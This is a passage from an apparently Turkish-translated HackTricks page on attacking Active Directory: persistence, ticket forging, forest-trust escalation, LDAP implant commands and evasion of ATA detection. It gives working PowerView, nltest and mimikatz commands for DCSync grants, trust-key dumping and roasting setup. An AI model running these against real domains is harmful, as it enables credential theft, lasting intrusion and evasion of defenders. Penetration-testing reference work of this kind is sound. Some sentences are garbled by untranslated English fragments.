{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Ele geçirilen kullanıcı, daha sonra **lateral movement**/ **privilege escalation** yapmanızı sağlayacak bazı **ilginç ayrıcalıklara domain objeleri üzerinde** sahip olabilir.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Domain içinde **Spool service dinleyen** makinelerin keşfi, **yeni kimlik bilgileri edinmek** ve **ayrıcalıkları yükseltmek** için **suistimal edilebilir**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Eğer **diğer kullanıcılar** **ele geçirilmiş** makineye **erişiyorsa**, bellekten **kimlik bilgileri toplanması** ve hatta **proseslerine beacon inject ederek onları taklit etmek** mümkündür.\
Genellikle kullanıcılar sisteme RDP ile erişir, bu yüzden üçüncü taraf RDP oturumları üzerinde birkaç saldırı nasıl yapılır burada bulabilirsiniz:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**, domain'e bağlı bilgisayarlar üzerinde **local Administrator password** yönetimi sağlar; bu parolaların **rastgele**, benzersiz ve sık **değiştirilmesini** garanti eder. Bu parolalar Active Directory içinde saklanır ve erişim yalnızca ACL'ler aracılığıyla yetkili kullanıcılara verilmiştir. Bu parolalara erişim için yeterli izinlere sahipseniz, diğer bilgisayarlara pivot yapmak mümkün hale gelir.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Ele geçirilmiş makineden **sertifikaların toplanması**, ortam içinde ayrıcalık yükseltme için bir yol olabilir:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Eğer **zayıf/vulnerable template'ler** yapılandırılmışsa, bunları istismar ederek ayrıcalık yükseltmek mümkündür:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Bir kez **Domain Admin** ya da daha iyisi **Enterprise Admin** ayrıcalıkları elde ettiğinizde, **domain veritabanını** (_ntds.dit_) **dump** edebilirsiniz.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Daha önce bahsedilen bazı teknikler persistence için kullanılabilir.\
Örneğin şunları yapabilirsiniz:

- Kullanıcıları [**Kerberoast**](kerberoast.md) için savunmasız hale getirmek

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Kullanıcıları [**ASREPRoast**](asreproast.md) için savunmasız hale getirmek

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Bir kullanıcıya [**DCSync**](#dcsync) ayrıcalıkları vermek

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack**, belirli bir servis için **meşru bir TGS ticket** oluşturur; bunun için **NTLM hash** (örneğin PC account hash'i) kullanılır. Bu yöntem, servisin ayrıcalıklarına **erişmek** için kullanılır.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack**, bir saldırganın Active Directory ortamında **krbtgt account**'un **NTLM hash'ine** erişmesiyle gerçekleşir. Bu hesap, tüm **TGT'lerin** imzalanmasında kullanıldığından özel bir konumdadır.

Saldırgan bu hash'e eriştiğinde, istediği herhangi bir hesap için **TGT'ler** oluşturabilir (Silver ticket attack benzeri).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Bunlar, yaygın golden ticket tespit mekanizmalarını **atlatacak** şekilde oluşturulmuş golden ticket'lara benzer.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Bir hesabın sertifikalarına sahip olmak veya bunları talep edebilmek**, kullanıcının hesabında (şifre değiştirilse bile) kalıcı olmak için çok iyi bir yoldur:


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Sertifikaları kullanarak**, domain içinde yüksek ayrıcalıklarla kalıcı olmak da mümkündür:


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory'deki **AdminSDHolder** objesi, **privileged grupların** (Domain Admins, Enterprise Admins gibi) güvenliğini sağlamak için bu gruplar üzerinde standart bir **ACL** uygular ve yetkisiz değişiklikleri engeller. Ancak, bu özellik suistimal edilebilir; eğer bir saldırgan AdminSDHolder'ın ACL'ini düzenleyip normal bir kullanıcıya tam erişim verirse, o kullanıcı tüm ayrıcalıklı gruplar üzerinde geniş kontrol kazanır. Bu güvenlik önlemi, yakın izlenmediği takdirde ters etki yaparak yetkisiz erişime yol açabilir.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Her **Domain Controller (DC)** içinde bir **local administrator** hesabı bulunur. Böyle bir makinede admin yetkisi elde ederek, local Administrator hash'i **mimikatz** ile çıkarılabilir. Ardından bu parolanın **kullanılabilmesi için** bir registry değişikliği yapmak gerekir; böylece local Administrator hesabına uzaktan erişim sağlanabilir.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Bazı **özel izinleri** bir **kullanıcıya** belirli domain objeleri üzerinde **verebilir** ve bu sayede kullanıcının ileride **ayrıcalık yükseltmesi** yapabilmesini sağlayabilirsiniz.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptor'lar**, bir **objenin** üzerinde **hangi izinlere** sahip olduğunu **saklamak** için kullanılır. Eğer bir objenin security descriptor'ında küçük bir değişiklik yapabilirseniz, o objeye ilişkin çok ilginç ayrıcalıkları, ayrıcalıklı bir grubun üyesi olmadan elde edebilirsiniz.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` auxiliary class'ını suistimal ederek `entryTTL`/`msDS-Entry-Time-To-Die` ile kısa ömürlü principal/GPO/DNS kayıtları oluşturun; bunlar tombstone bırakmadan kendi kendine silinir, LDAP delillerini yok ederken orphan SID'ler, kırık `gPLink` referansları veya önbelleğe alınmış DNS yanıtları bırakabilir (ör. AdminSDHolder ACE pollution veya kötü amaçlı `gPCFileSysPath`/AD-integrated DNS yönlendirmeleri).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Bellekte LSASS'i değiştirerek **evrensel bir parola** oluşturun; bu, tüm domain hesaplarına erişim sağlar.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Kendi **SSP**'nizi oluşturarak makineye erişimde kullanılan **kimlik bilgilerini** **clear text** olarak **yakalayabilirsiniz**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Active Directory'ye yeni bir **Domain Controller** kaydeder ve bunu belirli objelere (SIDHistory, SPN'ler...) **attribute'ları push etmek** için kullanır; bu işlem yapılan **değişikliklerle ilgili log** bırakmaz. DA ayrıcalıklarına ve **root domain** içinde olmaya ihtiyacınız vardır.\
Yanlış veri kullanırsanız çirkin loglar oluşabileceğini unutmayın.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Önceden LAPS parolalarını **okuma** için yeterli izne sahip olunca nasıl ayrıcalık yükseltileceğini tartışmıştık. Ancak bu parolalar aynı zamanda **persistence** için de kullanılabilir.\
Bakınız:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft, **Forest**'ı güvenlik sınırı olarak değerlendirir. Bu, **tek bir domain'in ele geçirilmesinin tüm Forest'ın ele geçirilmesine yol açabileceği** anlamına gelir.

### Basic Information

Bir [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>), bir **domain** dışından bir kullanıcının başka bir **domain**deki kaynaklara erişmesini sağlayan bir güvenlik mekanizmasıdır. İki domainin authentication sistemleri arasında bir bağlantı oluşturur ve authentication doğrulamalarının akmasına izin verir. Domainler trust kurduğunda, trust'ın bütünlüğü için kritik olan belirli **anahtarları** kendi **Domain Controller'larında (DC)** değiş tokuş edip saklarlar.

Tipik bir senaryoda, eğer bir kullanıcı **trusted domain** içindeki bir servise erişmek istiyorsa, önce kendi domain'inin DC'sinden özel bir ticket olan **inter-realm TGT** talep etmelidir. Bu TGT, iki domainin üzerinde anlaştığı paylaşılan bir **key** ile şifrelenir. Kullanıcı daha sonra bu TGT'yi **trusted domain'in DC'sine** sunarak bir servis ticket (**TGS**) alır. Eğer trusted domain'in DC'si inter-realm TGT'yi doğrularsa, servise erişimi sağlayan bir TGS verir.

**Adımlar**:

1. Bir **client computer** **Domain 1**'de, **NTLM hash**'ini kullanarak **Ticket Granting Ticket (TGT)** isteme sürecini başlatır ve bunu **Domain Controller (DC1)**'den ister.
2. DC1, client başarıyla doğrulanırsa yeni bir TGT verir.
3. Client daha sonra **Domain 2**'deki kaynaklara erişmek için DC1'den bir **inter-realm TGT** talep eder.
4. Inter-realm TGT, iki domain arasındaki iki yönlü domain trust'ın parçası olarak DC1 ve DC2 tarafından paylaşılan **trust key** ile şifrelenir.
5. Client, inter-realm TGT'yi **Domain 2'nin Domain Controller'ı (DC2)**'ye götürür.
6. DC2, inter-realm TGT'yi paylaşılan trust key ile doğrular ve geçerliyse client'ın erişmek istediği Domain 2 içindeki sunucu için bir **Ticket Granting Service (TGS)** verir.
7. Son olarak client, bu TGS'yi sunucuya sunar; TGS sunucunun account hash'i ile şifrelenmiştir ve böylece Domain 2'deki servise erişim sağlanır.

### Different trusts

Bir trust'ın **tek yönlü (1 way) veya iki yönlü (2 ways)** olabileceğini unutmayın. İki yönlü seçenekte her iki domain de birbirine güvenir; ancak **tek yönlü** trust ilişkilerinde bir domain **trusted**, diğeri ise **trusting** domain olur. Bu durumda, **trusted domain'den** yalnızca **trusting domain** içindeki kaynaklara erişebilirsiniz.

Eğer Domain A, Domain B'ye trust verdiyse, A trusting domain ve B trusted olandır. Ayrıca, **Domain A** içinde bu bir **Outbound trust**; **Domain B** içinde ise bu bir **Inbound trust** olur.

**Farklı trusting ilişkileri**

- **Parent-Child Trusts**: Aynı forest içinde yaygın bir yapılandırmadır; child domain otomatik olarak parent domain ile iki yönlü transitif bir trust'a sahiptir. Bu, parent ve child arasında authentication taleplerinin sorunsuz akabileceği anlamına gelir.
- **Cross-link Trusts**: "shortcut trusts" olarak adlandırılır; child domainler arasında referral süreçlerini hızlandırmak için oluşturulur. Karmaşık forest'larda authentication referral'ları genellikle forest root'a kadar çıkıp hedef domaine inmek zorundadır; cross-link'ler bu yolu kısaltır ve coğrafi olarak dağılmış ortamlarda önemlidir.
- **External Trusts**: Farklı ve alakasız domainler arasında oluşturulan, doğası gereği non-transitive trust'lardır. [Microsoft'un dokümantasyonuna](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) göre, external trust'lar mevcut forest dışında, forest trust ile bağlı olmayan bir domaindeki kaynaklara erişmek için kullanışlıdır. External trust'larda SID filtering ile güvenlik güçlendirilir.
- **Tree-root Trusts**: Forest root domain ile yeni eklenen bir tree root arasında otomatik olarak oluşturulan trust'lardır. Yaygın olmasalar da, yeni domain ağaçlarının bir forest'a eklenmesinde önemlidir; iki yönlü transitiviteyi sağlar ve ağaçların benzersiz domain isimlerini korumasına olanak verir. Daha fazla bilgi için [Microsoft'un rehberine](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) bakabilirsiniz.
- **Forest Trusts**: İki forest root domain arasında iki yönlü transitif trust'tır; SID filtering ile güvenlik önlemleri uygular.
- **MIT Trusts**: [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domain'leri ile kurulan trust'lardır. MIT trust'ları, Windows dışı Kerberos tabanlı sistemlerle entegrasyon gerektiren ortamlara yöneliktir.

#### Other differences in **trusting relationships**

- Bir trust ilişkisi ayrıca **transitive** (A B'ye trust veriyorsa, B C'ye trust veriyorsa A C'yi trust eder) veya **non-transitive** olarak da olabilir.
- Bir trust ilişkisi **bidirectional trust** (her iki taraf birbirine güvenir) veya **one-way trust** (yalnızca bir taraf diğerine güvenir) olarak kurulabilir.

### Attack Path

1. **Trusting ilişkilerini** enumerate edin
2. Hangi **security principal** (user/group/computer) diğer **domain** kaynaklarına **erişim** sahibi, ACE girdileri veya diğer domainin gruplarında yer alıyor mu kontrol edin. **Domain'ler arası ilişkileri** (trust için oluşturulmuş olabilir) arayın.
1. Bu durumda kerberoast başka bir seçenek olabilir.
3. Domain'ler arasında **pivot** yapabilecek **hesapları** **compromise** edin.

Başka bir domain'deki kaynaklara erişimi olan saldırganlar üç ana mekanizma üzerinden erişim sağlayabilir:

- **Local Group Membership**: Principal'lar makine üzerindeki “Administrators” gibi local gruplara eklenebilir; bu onlara o makine üzerinde önemli kontrol sağlar.
- **Foreign Domain Group Membership**: Principal'lar yabancı domain içindeki grupların üyesi de olabilir. Ancak bu yöntemin etkinliği trust'ın türüne ve grubun kapsamına bağlıdır.
- **Access Control Lists (ACLs)**: Principal'lar özellikle **DACL** içindeki **ACE** olarak belirtilmiş olabilir; bu onlara belirli kaynaklara erişim sağlar. ACL'ler, DACL'ler ve ACE'lerin mekanik detaylarına dalmak isteyenler için “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” adlı whitepaper değerli bir kaynaktır.

### Find external users/groups with permissions

Domain içindeki foreign security principal'ları bulmak için **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** kontrol edebilirsiniz. Bunlar **harici bir domain/forest**'ten gelen user/group'lar olacaktır.

Bunu **Bloodhound**'da veya powerview kullanarak kontrol edebilirsiniz:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Etki alanı trust'larını listelemenin diğer yolları:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Bu ortamda **2 trusted keys** var, biri _Child --> Parent_ için ve diğeri _Parent_ --> _Child_ için.\
> Geçerli domain tarafından kullanılan anahtarı şu komutlarla görebilirsiniz:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection ile trust'ı kötüye kullanarak child/parent domain'e Enterprise admin olarak yükseltin:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC)'nin nasıl exploit edilebileceğini anlamak kritik öneme sahiptir. Configuration NC, Active Directory (AD) ortamlarında bir forest genelinde yapılandırma verileri için merkezi bir depo görevi görür. Bu veriler forest içindeki her Domain Controller (DC)'ye replike edilir ve yazılabilir DC'ler Configuration NC'nin yazılabilir bir kopyasını tutar. Bunu exploit etmek için bir DC üzerinde **SYSTEM ayrıcalıklarına** sahip olmak gerekir; tercihen bir child DC.

**Link GPO to root DC site**

Configuration NC'nin Sites container'ı, AD forest içindeki tüm domain'e katılmış bilgisayarların site bilgilerini içerir. Herhangi bir DC üzerinde **SYSTEM** ayrıcalıklarıyla hareket ederek, saldırganlar GPO'ları root DC site'larına linkleyebilir. Bu eylem, bu sitelere uygulanan politikaları manipüle ederek root domain'in kompromitasyonuna yol açabilir.

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Bir saldırı vektörü, domain içindeki ayrıcalıklı gMSA'ları hedeflemeyi içerir. gMSA'ların parolalarını hesaplamak için gerekli olan KDS Root key, Configuration NC içinde saklanır. Herhangi bir DC üzerinde **SYSTEM** ayrıcalıklarına sahip olarak KDS Root key'e erişmek ve forest genelindeki herhangi bir gMSA için parolaları hesaplamak mümkündür.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Bu yöntem sabır gerektirir; yeni ayrıcalıklı AD objelerinin oluşturulmasını beklemek gerekir. **SYSTEM** ayrıcalıklarıyla, bir saldırgan AD Schema'yı değiştirerek herhangi bir kullanıcıya tüm sınıflar üzerinde tam kontrol verebilir. Bu, yeni oluşturulan AD objeleri üzerinde yetkisiz erişim ve kontrol ile sonuçlanabilir.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 zafiyeti, PKI objeleri üzerinde kontrol elde etmeyi hedefleyerek forest içindeki herhangi bir kullanıcı olarak kimlik doğrulamayı mümkün kılan bir certificate template oluşturulmasını sağlar. PKI objeleri Configuration NC'de bulunduğundan, yazılabilir bir child DC'nin kompromitasyonu ESC5 saldırılarının gerçekleştirilmesini sağlar.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Bu senaryoda **etki alanınız bir dış etki alanı tarafından güveniliyor** ve size onun üzerinde **belirsiz izinler** veriyor. Etki alanınızdaki **hangi kimliklerin dış etki alanı üzerinde hangi erişime sahip olduğunu** bulmanız ve sonra bunu istismar etmeyi denemeniz gerekecek:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Dış Orman Etki Alanı - Tek Yönlü (Giden)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Bu senaryoda **your domain** bazı **privileges**'ı **different domains**'ten bir principal'a **trusting** durumundadır.

Ancak, bir **domain is trusted** olduğunda, trusting domain tarafından trusted domain **creates a user**; bu kullanıcı **predictable name** sahibidir ve **password the trusted password** olarak ayarlanır. Bu da, **access a user from the trusting domain to get inside the trusted one** mümkün olduğu anlamına gelir; böylece hedefi enumerate edip daha fazla yetki yükseltmeye çalışabilirsiniz:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Trusted domain'i ele geçirmenin diğer bir yolu, domain trust'ın [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) ile **opposite direction**'ında oluşturulmuş bir bağlantı bulmaktır (bu çok yaygın değildir).

Trusted domain'i ele geçirmenin bir başka yolu da, **user from the trusted domain can access** şeklinde RDP ile giriş yapabilen bir makinede beklemektir. Saldırgan, RDP oturumu sürecine kod enjekte edebilir ve oradan **access the origin domain of the victim** yapabilir.  
Ayrıca, eğer **victim mounted his hard drive** ise, saldırgan **RDP session** sürecinden sabit diskin **startup folder of the hard drive**'ına **backdoors** yerleştirebilir. Bu teknik **RDPInception** olarak adlandırılır.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust kötüye kullanımını azaltma

### **SID Filtering:**

- Forest trusts arasında SID history attribute'ını kullanan saldırıların riski, tüm inter-forest trusts üzerinde varsayılan olarak etkinleştirilen SID Filtering ile azaltılır. Bu, Microsoft'un bakış açısına göre güvenlik sınırını domain yerine forest olarak kabul eden varsayıma dayanır; intra-forest trusts'ın güvenli olduğu kabul edilir.
- Ancak bir tuzak vardır: SID filtering uygulamaları ve kullanıcı erişimini bozabilir; bu yüzden ara sıra devre dışı bırakılabilir.

### **Selective Authentication:**

- Inter-forest trusts için Selective Authentication kullanımı, iki forest'ten kullanıcıların otomatik olarak authenticate edilmemesini sağlar. Bunun yerine, kullanıcıların trusting domain veya forest içindeki domainlere ve sunuculara erişmesi için açık izinler gerekir.
- Bu önlemlerin writable Configuration Naming Context (NC)'nin kötüye kullanılmasına veya trust account'a yönelik saldırılara karşı koruma sağlamadığını not etmek önemlidir.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## On-Host implantlardan LDAP tabanlı AD suistimali

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) bloodyAD-style LDAP primitives'lerini x64 Beacon Object Files olarak yeniden uygular; bunlar tamamen bir on-host implant içinde (ör. Adaptix C2) çalışır. Operatörler paketi `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` ile derler, `ldap.axs`'i yükler ve ardından beacon'dan `ldap <subcommand>` çağırır. Tüm trafik, mevcut logon security context üzerinden LDAP (389) üzerinde signing/sealing ile veya LDAPS (636) üzerinde otomatik sertifika trust ile gider; bu yüzden socks proxy'lere veya disk artefaktlarına ihtiyaç yoktur.

### Implant tarafı LDAP enumerasyonu

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` kısa isimleri/OU yollarını full DNs'e çözer ve ilgili nesneleri dump eder.
- `get-object`, `get-attribute`, and `get-domaininfo` rastgele attribute'ları (security descriptors dahil) ve ayrıca forest/domain metadata'sını `rootDSE`'den çeker.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` roasting candidates, delegation settings ve mevcut [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptor'larını doğrudan LDAP'tan açığa çıkarır.
- `get-acl` and `get-writable --detailed` DACL'ı parse ederek trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) ve inheritance'ı listeler; bu da ACL privilege escalation için anında hedefler sağlar.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP yazma ilkelikleri — yükseltme ve kalıcılık için

- Nesne oluşturma BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) operatöre OU haklarının olduğu yerlerde yeni principal veya makine hesaplarını hazırlama imkanı verir. `add-groupmember`, `set-password`, `add-attribute` ve `set-attribute` yazma-özelliği (write-property) hakları bulunduğunda hedefleri doğrudan ele geçirir.
- ACL odaklı komutlar (`add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, ve `add-dcsync`) herhangi bir AD nesnesinde WriteDACL/WriteOwner haklarını parola sıfırlamalarına, grup üyeliği kontrolüne veya DCSync replikasyon ayrıcalıklarına çevirir ve PowerShell/ADSI artefaktları bırakmaz. `remove-*` karşıtları enjekte edilen ACE'leri temizler.

### Delegation, roasting ve Kerberos suistimali

- `add-spn`/`set-spn` ele geçirilmiş bir kullanıcıyı anında Kerberoastable hale getirir; `add-asreproastable` (UAC toggle) parolaya dokunmadan AS-REP roasting için işaretler.
- Delegation makroları (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) beacon üzerinden `msDS-AllowedToDelegateTo`, UAC flag'leri veya `msDS-AllowedToActOnBehalfOfOtherIdentity` değerlerini yeniden yazar; bu, constrained/unconstrained/RBCD saldırı yollarını etkinleştirir ve uzaktan PowerShell veya RSAT ihtiyacını ortadan kaldırır.

### sidHistory injection, OU yeniden konumlandırma ve saldırı yüzeyi şekillendirme

- `add-sidhistory` ayrıcalıklı SIDs'i kontrol edilen bir principal'in SID history'sine enjekte eder (bkz. [SID-History Injection](sid-history-injection.md)), böylece LDAP/LDAPS üzerinden tam gizli erişim mirası sağlar.
- `move-object` bilgisayarların veya kullanıcıların DN/OU'sunu değiştirir, bir saldırganın varlıkları önceden devredilmiş hakların bulunduğu OUlere sürükleyip sonra `set-password`, `add-groupmember` veya `add-spn` ile suistimal etmesine olanak tanır.
- Sınırlı kapsamlı kaldırma komutları (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` vb.) operatör kimlik bilgilerini veya kalıcılığı topladıktan sonra hızlı bir geri alma sağlar ve telemetriyiyi en aza indirir.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Bazı Genel Savunmalar

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Kimlik Bilgisi Koruması için Savunma Önlemleri**

- **Domain Admins Kısıtlamaları**: Domain Admins'in sadece Domain Controllers'a giriş yapmasına izin verilmesi ve diğer hostlarda kullanılmamasının tavsiye edildiği önerilir.
- **Servis Hesabı Ayrıcalıkları**: Servisler güvenlik için Domain Admin (DA) ayrıcalıklarıyla çalıştırılmamalıdır.
- **Zamansal Ayrıcalık Sınırlandırması**: DA ayrıcalıkları gerektiren görevler için bu süre sınırlandırılmalıdır. Örnek: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay hafifletmesi**: Event ID'leri 2889/3074/3075 için denetim yapın ve ardından LDAP MITM/relay denemelerini engellemek için DC'lerde/istemcilerde LDAP signing ile LDAPS channel binding'i zorunlu kılın.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Deception Tekniklerini Uygulama**

- Deception uygulamak, şifreleri hiç sona ermeyen veya Trusted for Delegation olarak işaretlenmiş decoy kullanıcılar veya bilgisayarlar gibi tuzaklar kurmayı içerir. Ayrıntılı bir yaklaşım, belirli haklara sahip kullanıcılar oluşturmayı veya onları yüksek ayrıcalıklı gruplara eklemeyi içerir.
- Pratik bir örnek: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception tekniklerinin dağıtımı hakkında daha fazla bilgi için [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception)'a bakın.

### **Deception Tespit Etme**

- **Kullanıcı Nesneleri İçin**: Şüpheli göstergeler arasında tipik olmayan ObjectSID, nadiren yapılan oturum açmalar, oluşturulma tarihleri ve düşük bad password sayıları bulunur.
- **Genel Göstergeler**: Potansiyel decoy nesnelerin özniteliklerini gerçek olanlarla karşılaştırmak tutarsızlıkları ortaya çıkarabilir. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) gibi araçlar bu tespitte yardımcı olabilir.

### **Tespit Sistemlerini Aşma**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA tespitini önlemek için Domain Controllers üzerinde oturum dizini sorgulamaktan kaçınma.
- **Ticket Impersonation**: Ticket oluşturmak için **aes** anahtarlarını kullanmak, NTLM'e düşürmeyi engelleyerek tespit edilmekten kaçınmaya yardımcı olur.
- **DCSync Attacks**: ATA tespitinden kaçınmak için non-Domain Controller bir makineden yürütmek önerilir; doğrudan bir Domain Controller üzerinden yürütme alarmları tetikler.

## Referanslar

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
